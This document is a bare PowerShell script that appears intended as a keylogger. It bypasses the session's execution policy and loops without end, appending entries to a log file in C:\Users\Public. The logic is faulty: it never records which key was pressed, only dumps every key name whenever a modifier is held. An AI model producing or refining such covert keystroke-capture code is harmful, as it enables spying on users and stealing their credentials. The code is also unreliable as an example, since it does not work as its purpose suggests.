# Allow the script to run by bypassing the execution policy for this session
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

Add-Type -AssemblyName System.Windows.Forms

$logfile = "C:\Users\Public\keylog.txt"

$kbHook = [system.windows.forms.keys]

while ($true) {
    foreach ($key in [Enum]::GetValues($kbHook)) {
        if ([System.Windows.Forms.Control]::ModifierKeys -ne [System.Windows.Forms.Keys]::None) {
            Add-Content -Path $logfile -Value "$($key): Modifier Pressed"
        }
    }
    Start-Sleep -Milliseconds 100
}

Write-Output "Null" > $null 2>&1